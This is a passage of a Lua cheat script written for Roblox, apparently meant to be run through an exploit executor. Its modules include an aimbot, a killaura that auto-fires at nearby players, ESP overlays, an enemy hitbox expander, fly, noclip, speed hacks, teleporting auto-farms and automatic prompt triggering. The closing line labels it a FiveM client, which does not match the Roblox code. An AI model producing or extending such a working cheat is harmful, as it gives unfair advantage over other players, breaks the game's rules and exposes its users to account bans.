    elseif input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
        local mousePos = UIS:GetMouseLocation()
        local ray = Camera:ViewportPointToRay(mousePos.X, mousePos.Y)
        local raycastResult = workspace:Raycast(ray.Origin, ray.Direction * 2000)
        if raycastResult and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = raycastResult.Position
            local hrp = LP.Character.HumanoidRootPart
            local targetFlat = Vector3.new(targetPos.X, hrp.Position.Y, targetPos.Z)
            hrp.CFrame = CFrame.new(targetFlat + Vector3.new(0, 3, 0))
            Notify("Click TP", "Teleported to Mouse Position")
        end
    end
end)

UIS.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.E then
        getgenv().Config.FlyUp = false
    elseif input.KeyCode == Enum.KeyCode.Q then
        getgenv().Config.FlyDown = false
    end
end)

-- --- MODULE 6: AIMBOT ENGINE ---
local function IsPartVisible(part)
    if not getgenv().Config.WallCheck then return true end
    local ray = Camera:ViewportPointToRay(Camera:WorldToViewportPoint(part.Position).X, Camera:WorldToViewportPoint(part.Position).Y)
    local raycastResult = workspace:Raycast(ray.Origin, ray.Direction * 1000)
    if raycastResult and raycastResult.Instance and raycastResult.Instance:IsDescendantOf(part.Parent) then
        return true
    end
    return false
end

local function GetClosestTarget()
    local target = nil
    local shortestDistance = getgenv().Config.AimbotFOV
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChildOfClass("Humanoid") and player.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
            local pos, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
            if onScreen and IsPartVisible(player.Character.HumanoidRootPart) then
                local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
                if dist < shortestDistance then
                    shortestDistance = dist
                    target = player
                end
            end
        end
    end
    return target
end

RunService.RenderStepped:Connect(function()
    if FOVCircle then
        FOVCircle.Position = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
        FOVCircle.Radius = getgenv().Config.AimbotFOV
        FOVCircle.Visible = getgenv().Config.FOVVisible
    end

    if getgenv().Config.Aimbot and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestTarget()
        if target and target.Character and target.Character:FindFirstChild(getgenv().Config.AimbotTarget) then
            local targetPos = Camera:WorldToViewportPoint(target.Character[getgenv().Config.AimbotTarget].Position)
            local mousePos = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
            local moveX = (targetPos.X - mousePos.X) / getgenv().Config.AimbotSmooth
            local moveY = (targetPos.Y - mousePos.Y) / getgenv().Config.AimbotSmooth
            if mousemoverel then
                mousemoverel(moveX, moveY)
            else
                Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Character[getgenv().Config.AimbotTarget].Position)
            end
        end
    end
end)

-- --- MODULE 2: KILLAURA ENGINE WITH AUTO PISTOL & TP ---
local function GetPistolTool()
    if LP.Character then
        for _, tool in ipairs(LP.Character:GetChildren()) do
            if tool:IsA("Tool") then return tool end
        end
    end
    if LP.Backpack then
        for _, tool in ipairs(LP.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = LP.Character
                return tool
            end
        end
    end
    return nil
end

local function ClickCenterScreen()
    pcall(function()
        local vp = Camera.ViewportSize
        VirtualInputManager:SendMouseButtonEvent(vp.X / 2, vp.Y / 2, 0, true, game, 0)
        task.wait(0.05)
        VirtualInputManager:SendMouseButtonEvent(vp.X / 2, vp.Y / 2, 0, false, game, 0)
    end)
end

task.spawn(function()
    while task.wait(0.1) do
        if getgenv().Config.KillAura and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            local myHRP = LP.Character.HumanoidRootPart
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChildOfClass("Humanoid") and p.Character.Humanoid.Health > 0 then
                    local targetHRP = p.Character.HumanoidRootPart
                    local dist = (myHRP.Position - targetHRP.Position).Magnitude
                    if dist <= (getgenv().Config.KillAuraDist or 30) then
                        local tool = GetPistolTool()
                        if tool then
                            tool:Activate()
                            ClickCenterScreen()
                        end
                    end
                end
            end
        end
    end
end)

-- --- MODULE 3: SKOUPES AUTO-FARM ENGINE ---
task.spawn(function()
    while task.wait(0.3) do
        if getgenv().Config.SkoupesFarm and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            pcall(function()
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj.Name:lower():find("skoupa") or obj.Name:lower():find("trash") or obj.Name:lower():find("σκουπα") then
                        if obj:IsA("BasePart") then
                            LP.Character.HumanoidRootPart.CFrame = obj.CFrame * CFrame.new(0, 2, 0)
                            ClickCenterScreen()
                            task.wait(0.5)
                        end
                    end
                end
            end)
        end
    end
end)

-- --- MODULE 4: POSTMAN AUTO-MAIL DELIVERY ---
task.spawn(function()
    while task.wait(0.5) do
        if getgenv().Config.PostmanFarm and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            pcall(function()
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj.Name:lower():find("post") or obj.Name:lower():find("mail") or obj.Name:lower():find("γραμματατοκιβωτιο") then
                        if obj:IsA("BasePart") then
                            LP.Character.HumanoidRootPart.CFrame = obj.CFrame * CFrame.new(0, 3, 0)
                            ClickCenterScreen()
                            task.wait(0.8)
                        end
                    end
                end
            end)
        end
    end
end)

-- --- MODULE 5: FARMER 6-FIELDS AUTO-FARM ENGINE ---
task.spawn(function()
    while task.wait(0.4) do
        if getgenv().Config.FarmerFarm and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            pcall(function()
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj.Name:lower():find("crop") or obj.Name:lower():find("field") or obj.Name:lower():find("farm") or obj.Name:lower():find("φυτο") then
                        if obj:IsA("BasePart") then
                            LP.Character.HumanoidRootPart.CFrame = obj.CFrame * CFrame.new(0, 2, 0)
                            ClickCenterScreen()
                            task.wait(0.6)
                        end
                    end
                end
            end)
        end
    end
end)

-- --- MODULE 7: ESP RENDER ENGINE ---
local ESP_Objects = {}
local function CreateESP(p)
    if Drawing then
        local data = { Box = Drawing.new("Square"), Skelly = Drawing.new("Line"), Health = Drawing.new("Line"), Tracer = Drawing.new("Line"), Info = Drawing.new("Text") }
        data.Box.Thickness = 1.5; data.Box.Filled = false
        data.Skelly.Thickness = 1.5
        data.Health.Thickness = 2; data.Health.Color = Color3.fromRGB(0, 255, 100)
        data.Tracer.Thickness = 1.5
        data.Info.Size = 13; data.Info.Center = true; data.Info.Outline = true; data.Info.Color = Color3.fromRGB(255, 255, 255)
        ESP_Objects[p] = data
    end
end

RunService.RenderStepped:Connect(function()
    for p, d in pairs(ESP_Objects) do
        if getgenv().Config.ESP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            local HRP = p.Character.HumanoidRootPart
            local Pos, Vis = Camera:WorldToViewportPoint(HRP.Position)
            if Vis then
                local S = (Camera:WorldToViewportPoint(HRP.Position - Vector3.new(0, 3, 0)).Y - Camera:WorldToViewportPoint(HRP.Position + Vector3.new(0, 2.6, 0)).Y)
                d.Box.Size = Vector2.new(S * 1.3, S); d.Box.Position = Vector2.new(Pos.X - S/1.5, Pos.Y - S/2); d.Box.Color = Color3.fromRGB(231, 76, 60); d.Box.Visible = getgenv().Config.Box
                if getgenv().Config.Health and p.Character:FindFirstChildOfClass("Humanoid") then
                    local H = p.Character:FindFirstChildOfClass("Humanoid")
                    d.Health.From = Vector2.new(Pos.X + S/1.5 + 4, Pos.Y + S/2); d.Health.To = Vector2.new(Pos.X + S/1.5 + 4, Pos.Y + S/2 - (S * math.clamp(H.Health/H.MaxHealth, 0, 1))); d.Health.Visible = true
                else d.Health.Visible = false end
                if getgenv().Config.Skeleton and p.Character:FindFirstChild("Head") then
                    local HP = Camera:WorldToViewportPoint(p.Character.Head.Position)
                    d.Skelly.From = Vector2.new(HP.X, HP.Y); d.Skelly.To = Vector2.new(Pos.X, Pos.Y); d.Skelly.Color = Color3.fromRGB(255, 255, 255); d.Skelly.Visible = true
                else d.Skelly.Visible = false end
                if getgenv().Config.Tracers then
                    d.Tracer.From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y); d.Tracer.To = Vector2.new(Pos.X, Pos.Y + S/2); d.Tracer.Color = Color3.fromRGB(231, 76, 60); d.Tracer.Visible = true
                else d.Tracer.Visible = false end
                if getgenv().Config.Names or getgenv().Config.Distance then
                    local dist = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and math.floor((LP.Character.HumanoidRootPart.Position - HRP.Position).Magnitude) or 0
                    local txt = ""
                    if getgenv().Config.Names then txt = p.Name end
                    if getgenv().Config.Distance then txt = txt .. " [" .. dist .. "m]" end
                    d.Info.Text = txt
                    d.Info.Position = Vector2.new(Pos.X, Pos.Y - S/2 - 16)
                    d.Info.Visible = true
                else d.Info.Visible = false end
            else d.Box.Visible = false; d.Health.Visible = false; d.Skelly.Visible = false; d.Tracer.Visible = false; d.Info.Visible = false end
        else if d then d.Box.Visible = false; d.Health.Visible = false; d.Skelly.Visible = false; d.Tracer.Visible = false; d.Info.Visible = false end end
    end
end)

-- --- MODULE 8: FLY & MOVEMENT ENGINE ---
UIS.JumpRequest:Connect(function()
    if getgenv().Config.InfJump and LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
        LP.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

RunService.Stepped:Connect(function()
    if getgenv().Config.Noclip and LP.Character then
        for _, part in ipairs(LP.Character:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end
    end
    if getgenv().Config.AntiFallDamage and LP.Character then
        local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
        if hrp and hrp.Velocity.Y < -50 then
            hrp.Velocity = Vector3.new(hrp.Velocity.X, -25, hrp.Velocity.Z)
        end
    end
end)

RunService.RenderStepped:Connect(function()
    local Char = LP.Character
    if not Char or not Char:FindFirstChild("HumanoidRootPart") then return end
    local HRP = Char.HumanoidRootPart
    local Hum = Char:FindFirstChildOfClass("Humanoid")
    
    if getgenv().Config.Fly or getgenv().Config.LegitFly then
        local V = 0
        if getgenv().Config.FlyUp then V = getgenv().Config.FlySpeed elseif getgenv().Config.FlyDown then V = -getgenv().Config.FlySpeed else V = 0 end
        local moveDir = Hum and Hum.MoveDirection or Vector3.new(0,0,0)
        local hVel = moveDir * getgenv().Config.FlySpeed
        if getgenv().Config.LegitFly then
            HRP.Velocity = Vector3.new(hVel.X + (math.random(-5, 5)/100), V, hVel.Z + (math.random(-5, 5)/100))
        else
            HRP.Velocity = Vector3.new(hVel.X, V, hVel.Z)
        end
    end
    
    if Hum then
        if getgenv().Config.SpeedActive then Hum.WalkSpeed = getgenv().Config.SpeedValue or 45 else Hum.WalkSpeed = 16 end
    end
    
    if getgenv().Config.VehicleBoost and Hum and Hum.SeatPart and Hum.SeatPart:IsA("VehicleSeat") then
        local seat = Hum.SeatPart
        seat.MaxSpeed = getgenv().Config.VehicleSpeed or 220
        seat.Torque = 100
        if UIS:IsKeyDown(Enum.KeyCode.W) then
            seat.AssemblyLinearVelocity = seat.CFrame.LookVector * (getgenv().Config.VehicleSpeed or 220)
        end
    end
end)

-- --- MODULE 9: HITBOX EXPANDER ---
RunService.RenderStepped:Connect(function()
    if getgenv().Config.HitboxExpander then
        local hSize = Vector3.new(getgenv().Config.HitboxSize or 12, getgenv().Config.HitboxSize or 12, getgenv().Config.HitboxSize or 12)
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character and p.Character:FindFirstChild("Head") and p.Character and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
                pcall(function()
                    local head = p.Character.Head
                    head.Size = hSize
                    head.Transparency = 0.6
                    head.Color = Color3.fromRGB(231, 76, 60)
                    head.Material = Enum.Material.Neon
                    head.CanCollide = false
                end)
            end
        end
    end
end)

-- --- MODULE 10: SAFETY & PROXIMITY ENGINE ---
LP.Idled:Connect(function()
    if getgenv().Config.AntiAFK then
        VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end
end)

task.spawn(function()
    while task.wait(0.1) do
        if getgenv().Config.AutoPrompts then
            for _, prompt in ipairs(workspace:GetDescendants()) do
                if prompt:IsA("ProximityPrompt") then
                    prompt.HoldDuration = 0
                    if fireproximityprompt then
                        fireproximityprompt(prompt)
                    end
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function()
    local Char = LP.Character
    if Char and Char:FindFirstChild("HumanoidRootPart") and Char:FindFirstChild("Humanoid") then
        local hrp = Char.HumanoidRootPart
        local hum = Char.Humanoid
        if hrp.Position.Y < -800 then
            hrp.CFrame = CFrame.new(hrp.Position.X, 50, hrp.Position.Z)
            hrp.Velocity = Vector3.new(0, 0, 0)
        end
        if (hum.PlatformStand or hum.Sit) and getgenv().Config.Godmode then
            hum.PlatformStand = false
            hum.Sit = false
        end
    end
end)

for _, p in pairs(Players:GetPlayers()) do if p ~= LP then CreateESP(p) end end
Players.PlayerAdded:Connect(CreateESP)

print("FiveM Utility Client Engine Loaded Successfully v4.0.")
